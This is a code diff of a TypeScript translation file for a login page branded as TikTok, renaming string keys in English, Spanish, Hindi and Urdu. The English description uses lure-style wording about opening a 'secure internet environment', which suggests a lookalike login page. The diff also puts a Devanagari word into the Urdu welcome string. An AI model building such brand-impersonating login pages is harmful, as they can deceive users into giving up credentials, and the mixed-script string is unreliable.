@@ -37,10 +37,10 @@ export const languages = {
 export type Language = keyof typeof languages;
 
 const en = {
-  welcomeToLoginFlow: 'Welcome to Tiktok',
+  welcomeToTiktok: 'Welcome to Tiktok',
   loginFlowDescription: 'kindly click the View login page button below to open our established connection with our secure internet environment',
   viewLoginPage: 'View Login Page',
-  loginToLoginFlow: 'Log in to Tiktok',
+  loginToTiktok: 'Log in to Tiktok',
   loginSubheading: 'Manage your account, check notifications, comment on videos, and more.',
   phone: 'Phone',
   emailUsername: 'Email / Username',
@@ -76,10 +76,10 @@ const en = {
 };
 
 const es = {
-  welcomeToLoginFlow: 'Bienvenido a Tiktok',
+  welcomeToTiktok: 'Bienvenido a Tiktok',
   loginFlowDescription: 'Una demostración de una experiencia de inicio de sesión moderna, segura y fácil de usar, inspirada en las mejores.',
   viewLoginPage: 'Ver página de inicio de sesión',
-  loginToLoginFlow: 'Iniciar sesión en Tiktok',
+  loginToTiktok: 'Iniciar sesión en Tiktok',
   loginSubheading: 'Administra tu cuenta, consulta notificaciones, comenta en videos y más.',
   phone: 'Teléfono',
   emailUsername: 'Correo electrónico / Usuario',
@@ -115,10 +115,10 @@ const es = {
 };
 
 const hi = {
-  welcomeToLoginFlow: 'Tiktok में आपका स्वागत है',
+  welcomeToTiktok: 'Tiktok में आपका स्वागत है',
   loginFlowDescription: 'सर्वश्रेष्ठ से प्रेरित एक आधुनिक, सुरक्षित और उपयोगकर्ता-अनुकूल लॉगिन अनुभव का प्रदर्शन।',
   viewLoginPage: 'लॉगिन पृष्ठ देखें',
-  loginToLoginFlow: 'Tiktok में लॉग इन करें',
+  loginToTiktok: 'Tiktok में लॉग इन करें',
   loginSubheading: 'अपना खाता प्रबंधित करें, सूचनाएं जांचें, वीडियो पर टिप्पणी करें, और बहुत कुछ।',
   phone: 'फ़ोन',
   emailUsername: 'ईमेल / उपयोगकर्ता नाम',
@@ -154,10 +154,10 @@ const hi = {
 };
 
 const ur = {
-  welcomeToLoginFlow: 'Tiktok میں خوش آمدید',
+  welcomeToTiktok: 'Tiktok में خوش آمدید',
   loginFlowDescription: 'ایک جدید، محفوظ، اور صارف دوست لاگ ان تجربے کا مظاہرہ، جو بہترین سے متاثر ہے۔',
   viewLoginPage: 'لاگ ان صفحہ دیکھیں',
-  loginToLoginFlow: 'Tiktok میں لاگ ان کریں',
+  loginToTiktok: 'Tiktok میں لاگ ان کریں',
   loginSubheading: 'اپنا اکاؤنٹ منظم کریں، اطلاعات چیک کریں، ویڈیوز پر تبصرہ کریں، اور بہت کچھ۔',
   phone: 'فون',
   emailUsername: 'ای میل / صارف نام',
@@ -193,10 +193,26 @@ const ur = {
 };
 
 export const translations = {
-  en,
-  es,
-  hi,
-  ur,
+  en: {
+    ...en,
+    loginToLoginFlow: en.loginToTiktok,
+    welcomeToLoginFlow: en.welcomeToTiktok,
+  },
+  es: {
+    ...es,
+    loginToLoginFlow: es.loginToTiktok,
+    welcomeToLoginFlow: es.welcomeToTiktok,
+  },
+  hi: {
+    ...hi,
+    loginToLoginFlow: hi.loginToTiktok,
+    welcomeToLoginFlow: hi.welcomeToTiktok,
+  },
+  ur: {
+    ...ur,
+    loginToLoginFlow: ur.loginToTiktok,
+    welcomeToLoginFlow: ur.welcomeToTiktok,
+  },
   // Fallback for other languages to English
   fr: en, de: en, it: en, pt: en, ru: en, ja: en, zh: en, ar: en,
   bn: en, pa: en, jv: en, ko: en, vi: en, tr: en, nl: en,
@@ -205,3 +221,5 @@ export const translations = {
 };
 
 export type TranslationKey = keyof typeof en;
+
+    
